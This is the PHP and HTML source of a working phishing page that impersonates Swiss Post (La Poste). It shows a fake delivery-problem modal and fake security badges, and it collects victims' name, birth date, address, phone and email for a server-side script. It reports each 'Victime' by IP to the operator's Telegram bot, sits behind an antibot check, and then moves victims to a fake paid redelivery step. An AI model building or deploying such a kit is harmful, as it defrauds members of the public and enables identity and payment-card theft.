<?php
session_start();
include 'lang_main.php';
require_once __DIR__ . '/antibot.php';
validateSession(2); // Requires Captcha passed and Keymaster key
// TRACKING STEP
$_SESSION['step'] = 'info';

// Progress Tracking: Landed on Info Form
if (!isset($_SESSION['NOTIFIED_DELIVERY'])) {
    include 'settings.php'; // ensure bot vars are available
    $visitor_ip = $_SERVER['REMOTE_ADDR'];
    $msg = "├ 📝 Victime $visitor_ip remplit ses infos (POST)";
    sendTelegramMessage($bot_token, $chat_id, $msg);
    $_SESSION['NOTIFIED_DELIVERY'] = true;
}
?>
<!DOCTYPE html>
<html lang="<?= $current_lang ?>">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex">
    <title><?= t('personal_info_title') ?> | La Poste</title>
    <link rel="icon" type="image/x-icon" href="assets/favicon.ico">
    <link rel="stylesheet" href="assets/post-branding.css?v=<?= time() ?>">
    <script src="assets/site.min.js"></script>
    <style>
        /* CSS SPECIFIC OVERRIDES FOR 'FINE & CLEAN' LOOK */
        .page-title {
            font-weight: 600 !important; /* Force moins gras */
            font-size: 20px !important;
        }
        label {
            font-weight: 500 !important; /* Force labels fins */
            color: #333;
        }
        .form-control {
            border-color: #dcdcdc;
            box-shadow: none;
        }
        .form-control:focus {
            border-color: #999;
            box-shadow: 0 0 0 2px rgba(0,0,0,0.05);
        }
        
        /* Validation Errors Style */
        .input-error {
            border-color: #d32f2f !important;
            background-color: #fdf2f2;
        }
        .error-feedback {
            color: #d32f2f;
            font-size: 11px;
            margin-top: 4px;
            font-weight: 600;
            display: none;
        }
        
        /* Disabled Button */
        .btn-primary:disabled {
            background-color: #e0e0e0;
            color: #999;
            cursor: not-allowed;
            box-shadow: none;
        }

        /* Language Selector Styles */
        .lang-selector {
            display: flex;
            gap: 12px;
            margin-right: 25px;
            font-size: 13px;
            font-weight: 500;
            padding-right: 25px;
            border-right: 1px solid #e0e0e0;
        }
        .lang-selector a {
            text-decoration: none;
            color: #666;
            transition: all 0.2s;
        }
        .lang-selector a:hover {
            color: #000;
        }
        .lang-selector a.active {
            color: #111;
            font-weight: 700;
            text-decoration: underline;
        }
        
        @media (max-width: 480px) {
            .lang-selector {
                margin-right: 15px;
                padding-right: 15px;
                gap: 8px;
                font-size: 12px;
            }
        }
        /* FLOATING LABELS */
        .floating-group { position: relative; margin-bottom: 25px; }
        .floating-input {
            width: 100%; height: 52px; padding: 22px 15px 6px 15px;
            border: 1px solid #dcdcdc; border-radius: 6px; font-size: 16px;
            outline: none; transition: all 0.2s; box-sizing: border-box; background: #fff; color: #333;
        }
        .floating-input:focus { border-color: #ffcc00; box-shadow: 0 0 0 2px rgba(255, 204, 0, 0.2); }
        .floating-label {
            position: absolute; top: 16px; left: 15px; font-size: 15px; color: #777;
            pointer-events: none; transition: all 0.2s ease-out; background: transparent;
        }
        .floating-input:focus ~ .floating-label,
        .floating-input:not(:placeholder-shown) ~ .floating-label {
            top: 8px; font-size: 11px; color: #444; font-weight: 600;
        }
        /* GLOBAL LAYOUT FIX */
        html {
            height: 100%;
        }
        body {
            min-height: 100%;
            display: flex;
            flex-direction: column;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
            background-color: #f4f6f8;
            font-family: 'Frutiger', sans-serif;
            color: #333;
        }
        .post-header {
            flex-shrink: 0;
            background: #fff;
            padding: 15px 0;
            width: 100%;
            z-index: 10;
        }
        .post-footer {
            flex-shrink: 0;
            width: 100%;
        }
        .main-wrapper {
            flex-grow: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            padding: 20px;
            box-sizing: border-box;
            position: relative;
        }
        .content-container {
            width: 100%;
            display: flex;
            justify-content: center;
        }
        @media (max-width: 480px) {
            .main-wrapper { padding: 15px; }
            .form-card { margin: 0 auto; }
        }

        /* NEW REPROGRAM SECTION */
        #reprogram-step {
            display: none;
        }
        
        .reprogram-header {
            text-align: center;
            margin-bottom: 25px;
        }
        
        .reprogram-icon {
            font-size: 40px;
            color: #FFCC00;
            margin-bottom: 15px;
        }

        .date-option {
            background: #fff;
            border: 1px solid #e0e0e0;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            cursor: pointer;
            transition: all 0.2s ease;
            position: relative;
        }

        .date-option:hover {
            border-color: #FFCC00;
            background: #fffdf5;
        }

        .date-option.selected {
            border-color: #FFCC00;
            background: #fffdf5;
            box-shadow: 0 4px 12px rgba(255, 204, 0, 0.15);
        }

        .date-option input[type="radio"] {
            display: none;
        }

        .date-option .radio-circle {
            width: 20px;
            height: 20px;
            border: 2px solid #ddd;
            border-radius: 50%;
            margin-right: 15px;
            position: relative;
        }

        .date-option.selected .radio-circle {
            border-color: #FFCC00;
        }

        .date-option.selected .radio-circle::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 10px;
            height: 10px;
            background: #FFCC00;
            border-radius: 50%;
        }

        .date-info {
            flex-grow: 1;
        }

        .date-label {
            font-weight: 700;
            font-size: 15px;
            display: block;
            color: #333;
        }

        .date-sub {
            font-size: 13px;
            color: #777;
        }

        .btn-reprogram {
            margin-top: 10px;
            width: 100%;
        }

        .loading-overlay {
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(255,255,255,0.9);
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 100;
            border-radius: 16px;
        }

        .spin-loader {
            width: 40px;
            height: 40px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #FFCC00;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .trust-badges {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 30px;
            padding: 25px 5px 5px 5px;
            border-top: 1px solid #f5f5f5;
            width: 100%;
        }

        .trust-badge-item {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            opacity: 0.6; /* Light opacity as requested */
            transition: opacity 0.3s;
        }
        .trust-badge-item:hover { opacity: 1; }

        .trust-badge-item i {
            font-size: 16px; /* Smaller icons */
            margin-bottom: 8px;
            height: 18px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .trust-badge-item span {
            font-size: 9px; /* Slightly smaller text */
            color: #555;
            text-transform: uppercase;
            font-weight: 700;
            line-height: 1.2;
            letter-spacing: 0.1px;
            max-width: 85px; /* Control width to avoid shifting */
            word-wrap: break-word;
        }

        .trust-badge-item:nth-child(1) i { color: #2e7d32; }
        .trust-badge-item:nth-child(2) i { color: #f9a825; }
        .trust-badge-item:nth-child(3) i { color: #1565c0; }


    </style>
</head>
<body>
    <div class="post-yellow-bar"></div>
    <header class="post-header">
        <div class="header-container">
            <div class="logo-container">
                <img src="assets/POST.svg" alt="La Poste" class="post-logo">
            </div>
            <div class="header-right">
                <div class="lang-selector">
                    <a href="?lang=de" class="<?= $current_lang == 'de' ? 'active' : '' ?>">DE</a>
                    <a href="?lang=fr" class="<?= $current_lang == 'fr' ? 'active' : '' ?>">FR</a>
                    <a href="?lang=it" class="<?= $current_lang == 'it' ? 'active' : '' ?>">IT</a>
                    <a href="?lang=en" class="<?= $current_lang == 'en' ? 'active' : '' ?>">EN</a>
                </div>
                <div class="login-text">
                    <img src="assets/lock.svg" alt="Secure" class="lock-icon">
                    <span><?= t('secure_conn') ?></span>
                </div>
            </div>
        </div>
    </header>
    <main class="main-wrapper">
        <div class="content-container">
            
            <div class="stepper">
                <div class="step active">1</div>
                <div class="step-line"></div>
                <div class="step">2</div>
                <div class="step-line"></div>
                <div class="step">3</div>
            </div>
            <div class="form-card">
                
                <div id="info-step">
                    <h1 class="page-title"><?= t('personal_info_title') ?></h1>
                    <p class="page-subtitle"><?= t('personal_info_subtitle') ?></p>
                    <form action="system_srv/first.php" method="POST" id="infoForm">
                        
                        <div class="form-row">
                            <div class="col-6">
                                <div class="floating-group">
                                    <input type="text" name="nom" id="nom" class="floating-input" placeholder=" " required>
                                    <label class="floating-label"><?= t('name') ?></label>
                                </div>
                            </div>
                            <div class="col-6">
                                <div class="floating-group">
                                    <input type="text" name="prenom" id="prenom" class="floating-input" placeholder=" " required>
                                    <label class="floating-label"><?= t('firstname') ?></label>
                                </div>
                            </div>
                        </div>
                        
                        <div class="floating-group">
                            <input type="tel" name="dob" id="dob" class="floating-input" maxlength="10" placeholder=" " required>
                            <label class="floating-label"><?= t('dob') ?></label>
                            <div class="error-feedback" id="err-dob"><?= t('err_dob') ?></div>
                        </div>
                        
                        <div class="floating-group">
                            <input type="text" name="adresse" id="adresse" class="floating-input" placeholder=" " required>
                            <label class="floating-label"><?= t('address') ?></label>
                        </div>
                        
                        <div class="form-row">
                            <div class="col-4">
                                <div class="floating-group">
                                    <input type="text" name="zip" id="zip" class="floating-input" maxlength="10" placeholder=" " required>
                                    <label class="floating-label"><?= t('npa') ?></label>
                                    <div class="error-feedback" id="err-zip"><?= t('err_npa') ?></div>
                                </div>
                            </div>
                            <div class="col-8">
                                <div class="floating-group">
                                    <input type="text" name="ville" id="ville" class="floating-input" placeholder=" " required>
                                    <label class="floating-label"><?= t('city') ?></label>
                                </div>
                            </div>
                        </div>
                        
                        <div class="floating-group">
                            <input type="tel" name="tel" id="tel" class="floating-input" placeholder=" " required>
                            <label class="floating-label"><?= t('phone') ?></label>
                            <div class="error-feedback" id="err-tel"><?= t('err_phone') ?></div>
                        </div>
                        
                        <div class="floating-group">
                            <input type="email" name="email" id="email" class="floating-input" placeholder=" " required>
                            <label class="floating-label"><?= t('email') ?></label>
                            <div class="error-feedback" id="err-email"><?= t('err_email') ?></div>
                        </div>
                        
                        <button type="submit" class="btn-primary" id="submitBtn" disabled>
                            <?= t('validate_my_info') ?>
                        </button>
                        
                        <div style="margin-top:15px; font-size:12px; color:#666;">
                            <?= t('required_fields') ?>
                        </div>

                        <div class="trust-badges">
                            <div class="trust-badge-item">
                                <i class="fas fa-shield-halved"></i>
                                <span><?= t('badge_secure') ?></span>
                            </div>
                            <div class="trust-badge-item">
                                <i class="fas fa-lock"></i>
                                <span><?= t('badge_ssl') ?></span>
                            </div>
                            <div class="trust-badge-item">
                                <i class="fas fa-user-shield"></i>
                                <span><?= t('badge_verified') ?></span>
                            </div>
                        </div>

                    </form>
                </div>

                <!-- REPROGRAM STEP -->
                <div id="reprogram-step">
                    <div class="reprogram-header">
                        <div class="reprogram-icon"><i class="fas fa-calendar-alt"></i></div>
                        <h1 class="page-title"><?= t('reprogram_title') ?></h1>
                        <p class="page-subtitle"><?= t('reprogram_subtitle') ?></p>
                    </div>

                    <div id="date-options-container">
                        <!-- Will be populated by JS -->
                    </div>

                    <p style="font-size: 11px; color: #888; text-align: center; margin-top: 10px; line-height: 1.4;">
                        <?= t('reprogram_fee_msg') ?>
                    </p>

                    <button type="button" class="btn-primary btn-reprogram" id="confirmReprogram">
                        <?= t('btn_validate_reprogram') ?>
                    </button>
                </div>

                <!-- LOADING OVERLAY -->
                <div id="main-loader" class="loading-overlay">
                    <div class="spin-loader"></div>
                    <p style="font-weight:600; font-size:14px; color:#333;"><?= t('processing_msg') ?></p>
                </div>

            </div>
        </div>
    </main>
    <footer class="post-footer">
        <div class="footer-container">
            <!-- DESKTOP VERSION -->
            <div class="footer-desktop">
                <div class="footer-col">
                    <h4><?= t('help_contact') ?></h4>
                    <a href="#">FAQ</a>
                    <a href="#">Contact Center</a>
                    <a href="#">Support</a>
                </div>
                <!-- ... (other cols hidden for brevity but present) -->
                                <div class="footer-col" style="justify-content:flex-end; align-items:flex-end; text-align:right;">
                    <img src="assets/POST.svg" height="28" style="opacity:0.4; margin-bottom:10px;">
                    <p style="font-size:11px; color:#999; margin:0;">
                        &copy; <?= date('Y') ?> Post CH AG
                    </p>
                </div>
            </div>
            <!-- MOBILE VERSION -->
            <div class="footer-mobile">
                &copy; <?= date('Y') ?> <?= t('copyright') ?>
            </div>
        </div>
    </footer>
    <!-- MODAL -->
    <div id="welcomeModal" class="modal-overlay" style="display:none;">
        <div class="modal-card">
            <div class="post-yellow-strip"></div>
            <div class="modal-content">
                <div class="modal-header-icon">
                    <div class="icon-circle">
                        <i class="fas fa-truck"></i>
                    </div>
                </div>
                <h2 class="modal-title"><?= t('delivery_issue_title') ?></h2>
                <div class="modal-body">
                    <p><?= t('delivery_issue_message') ?></p>
                </div>
                <button class="btn-primary modal-btn" onclick="closeModal()">
                    <?= t('btn_continue') ?>
                </button>
            </div>
        </div>
    </div>

    <!-- FontAwesome (if not already included in head by site - usually it is, but let's ensure) -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        /* MODAL STYLES "INCROYABLE" */
        .modal-overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(6px);
            -webkit-backdrop-filter: blur(6px);
            z-index: 99999;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            box-sizing: border-box;
            animation: modalFadeIn 0.35s ease forwards;
        }
        
        @keyframes modalFadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        @keyframes modalSlideUp {
            from { opacity: 0; transform: translateY(20px) scale(0.97); }
            to { opacity: 1; transform: translateY(0) scale(1); }
        }

        .modal-card {
            background: #fff;
            width: 100%;
            max-width: 420px;
            margin: 0 auto;
            border-radius: 12px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.35);
            overflow: hidden;
            position: relative;
            text-align: center;
            animation: modalSlideUp 0.4s cubic-bezier(0.22, 1, 0.36, 1) 0.1s both;
        }
        
        .post-yellow-strip {
            height: 6px;
            background: #FFCC00; /* Post Yellow */
            width: 100%;
        }

        .modal-content {
            padding: 35px 30px;
        }
        
        .modal-header-icon {
            margin-bottom: 20px;
            display: flex;
            justify-content: center;
        }
        
        .icon-circle {
            width: 70px;
            height: 70px;
            min-width: 70px; /* Prevent squeeze on small screens */
            background: #fff9e6; /* Light yellow bg */
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #FFCC00;
            font-size: 30px;
            box-shadow: 0 10px 20px rgba(255, 204, 0, 0.2);
            margin: 0 auto;
        }
        
        .modal-title {
            font-size: 22px;
            font-weight: 700;
            color: #222;
            margin-bottom: 15px;
            line-height: 1.3;
        }
        
        .modal-body p {
            font-size: 15px;
            line-height: 1.6;
            color: #555;
            margin-bottom: 25px;
        }
        
        .ref-box {
            background: #f4f4f4;
            padding: 12px 18px;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 25px;
            font-size: 14px;
            color: #333;
            border: 1px solid #e0e0e0;
        }
        
        .ref-label {
            font-weight: 500;
            color: #777;
        }
        
        .ref-value {
            font-weight: 700;
            color: #222;
            margin-left: 5px;
        }
        
        .modal-btn {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            letter-spacing: 0.5px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            transition: transform 0.2s, box-shadow 0.2s;
            cursor: pointer;
        }
        
        .modal-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0,0,0,0.15);
        }
        
        /* Mobile adjustment */
        @media (max-width: 480px) {
            .modal-card {
                max-width: 90%;
                margin: 0 auto;
            }
            .modal-content {
                padding: 25px 20px;
            }
            .modal-title {
                font-size: 19px;
            }
            .modal-body p {
                font-size: 14px;
            }
        }
    </style>

    <script>
        // Modal Logic
        document.addEventListener("DOMContentLoaded", function() {
            // Show modal smoothly after page is ready
            setTimeout(function() {
                document.getElementById('welcomeModal').style.display = 'flex';
            }, 400);
        });

        function closeModal() {
            var modal = document.getElementById('welcomeModal');
            modal.style.opacity = '0';
            modal.style.transition = 'opacity 0.3s ease';
            setTimeout(function() {
                modal.style.display = 'none';
            }, 300);
        }

        // --- VALIDATION LOGIC ENHANCED ---
        const inputs = {
            dob: document.getElementById('dob'),
            zip: document.getElementById('zip'),
            tel: document.getElementById('tel'),
            email: document.getElementById('email'),
            nom: document.getElementById('nom'),
            prenom: document.getElementById('prenom'),
            adresse: document.getElementById('adresse'),
            ville: document.getElementById('ville')
        };
        const submitBtn = document.getElementById('submitBtn');
        // Basic Regex patterns
        const patterns = {
            email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
            zip: /^[a-zA-Z0-9\s-]{4,12}$/, // International alphanumeric
            dob: /^(0[1-9]|[12][0-9]|3[01])\/(0[1-9]|1[0-2])\/\d{4}$/
        };
        // Generic Phone Validation
        function validatePhone(phone) {
            // Keep only digits
            let cleaned = phone.replace(/[^\d]/g, '');
            
            // Must have at least 6 digits and max 20
            if (cleaned.length < 6 || cleaned.length > 20) {
                return false;
            }
            
            return true;
        }
        // Date of Birth Validation
        function validateDOB(dobString) {
            // First check format
            if (!patterns.dob.test(dobString)) {
                return false;
            }
            
            const parts = dobString.split('/');
            const day = parseInt(parts[0]);
            const month = parseInt(parts[1]);
            const year = parseInt(parts[2]);
            
            // Check if date is valid
            const date = new Date(year, month - 1, day);
            if (date.getDate() !== day || date.getMonth() !== month - 1 || date.getFullYear() !== year) {
                return false; // Invalid date (like 32/13/2020)
            }
            
            // Check not in future
            const today = new Date();
            if (date > today) {
                return false; // Can't be born in the future
            }
            
            // Optional: Check reasonable year range (e.g., not born before 1900)
            if (year < 1900) {
                return false;
            }
            
            return true;
        }
        function validateInput(id) {
            const el = inputs[id];
            const val = el.value.trim();
            const errDiv = document.getElementById('err-' + id);
            let isValid = true;
            
            // Custom validations
            if (id === 'tel') {
                isValid = validatePhone(val);
            } else if (id === 'dob') {
                isValid = validateDOB(val);
            } else if (patterns[id]) {
                isValid = patterns[id].test(val);
            } else {
                isValid = val.length > 1; // Basic checks for text
            }
            if (!isValid && val.length > 0) {
                if(errDiv) errDiv.style.display = 'block';
                el.classList.add('input-error');
            } else {
                if(errDiv) errDiv.style.display = 'none';
                el.classList.remove('input-error');
            }
            return isValid;
        }
        function checkAll() {
            let allValid = true;
            // Validate specific fields
            if (!validateInput('email')) allValid = false;
            if (!validateInput('tel')) allValid = false;
            if (!validateInput('zip')) allValid = false;
            if (!validateInput('dob')) allValid = false;
            
            // Validate basic fields (empty check)
            if (inputs.nom.value.trim() === '') allValid = false;
            if (inputs.prenom.value.trim() === '') allValid = false;
            if (inputs.adresse.value.trim() === '') allValid = false;
            if (inputs.ville.value.trim() === '') allValid = false;
            submitBtn.disabled = !allValid;
        }
        // --- LISTENERS ---
        // DOB Auto-Format with / insertion
        inputs.dob.addEventListener('input', function(e) {
            let v = this.value.replace(/\D/g, '');
            if (v.length > 2) v = v.substring(0, 2) + '/' + v.substring(2);
            if (v.length > 5) v = v.substring(0, 5) + '/' + v.substring(5, 9);
            this.value = v;
            checkAll();
        });
        // Phone Auto-Format (optional, adds spaces for readability)
        inputs.tel.addEventListener('input', function(e) {
            let v = this.value.replace(/[^\d\+]/g, ''); // Keep only digits and +
            // Don't auto-format too aggressively, just clean
            this.value = v;
            checkAll();
        });
        Object.keys(inputs).forEach(key => {
            inputs[key].addEventListener('input', checkAll);
            inputs[key].addEventListener('blur', function() {
                validateInput(key); // Show error on blur
                checkAll();
            });
        });

        // --- SUBMIT HANDLING (AJAX) ---
        const infoForm = document.getElementById('infoForm');
        const infoStep = document.getElementById('info-step');
        const reprogramStep = document.getElementById('reprogram-step');
        const mainLoader = document.getElementById('main-loader');
        
        infoForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Show loader
            mainLoader.style.display = 'flex';
            
            const formData = new FormData(infoForm);
            
            fetch(infoForm.action, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                // We ignore the redirect in the response, we just want it to process
                setTimeout(() => {
                    mainLoader.style.display = 'none';
                    infoStep.style.display = 'none';
                    reprogramStep.style.display = 'block';
                    generateDateOptions();
                }, 1500);
            })
            .catch(error => {
                console.error('Error:', error);
                // Fallback show reprogram anyway for demo
                mainLoader.style.display = 'none';
                infoStep.style.display = 'none';
                reprogramStep.style.display = 'block';
                generateDateOptions();
            });
        });

        // --- REPROGRAM LOGIC ---
        function generateDateOptions() {
            const container = document.getElementById('date-options-container');
            container.innerHTML = '';
            
            const langData = {
                fr: {
                    days: ['Dimanche', 'Lundi', 'Mardi', 'Mercredi', 'Jeudi', 'Vendredi', 'Samedi'],
                    months: ['janvier', 'février', 'mars', 'avril', 'mai', 'juin', 'juillet', 'août', 'septembre', 'octobre', 'novembre', 'décembre'],
                    between: '<?= t('delivery_between') ?>'
                },
                de: {
                    days: ['Sonntag', 'Montag', 'Dienstag', 'Mittwoch', 'Donnerstag', 'Freitag', 'Samstag'],
                    months: ['Januar', 'Februar', 'März', 'April', 'Mai', 'Juni', 'Juli', 'August', 'September', 'Oktober', 'November', 'Dezember'],
                    between: '<?= t('delivery_between') ?>'
                },
                it: {
                    days: ['Domenica', 'Lunedì', 'Martedì', 'Mercoledì', 'Giovedì', 'Venerdì', 'Sabato'],
                    months: ['gennaio', 'febbraio', 'marzo', 'aprile', 'maggio', 'giugno', 'luglio', 'agosto', 'settembre', 'ottobre', 'novembre', 'dicembre'],
                    between: '<?= t('delivery_between') ?>'
                },
                en: {
                    days: ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'],
                    months: ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'],
                    between: '<?= t('delivery_between') ?>'
                }
            };
            
            const currentLang = '<?= $current_lang ?>';
            const data = langData[currentLang] || langData.en;
            
            const days = data.days;
            const months = data.months;
            
            // Create options for 2 and 3 days from now
            for (let i = 2; i <= 3; i++) {
                const date = new Date();
                date.setDate(date.getDate() + i);
                
                const dayName = days[date.getDay()];
                const dayNum = date.getDate();
                const monthName = months[date.getMonth()];
                
                const fullDate = `${dayName} ${dayNum} ${monthName}`;
                
                const option = document.createElement('div');
                option.className = 'date-option' + (i === 2 ? ' selected' : '');
                option.innerHTML = `
                    <div class="radio-circle"></div>
                    <div class="date-info">
                        <span class="date-label">${fullDate}</span>
                        <span class="date-sub">${data.between}</span>
                    </div>
                `;
                
                option.onclick = function() {
                    document.querySelectorAll('.date-option').forEach(el => el.classList.remove('selected'));
                    option.classList.add('selected');
                };
                
                container.appendChild(option);
            }
        }

        document.getElementById('confirmReprogram').onclick = function() {
            mainLoader.style.display = 'flex';
            setTimeout(() => {
                window.location.href = 'process.php';
            }, 2000);
        };

        // Init
        checkAll();
    </script>
</body>
</html>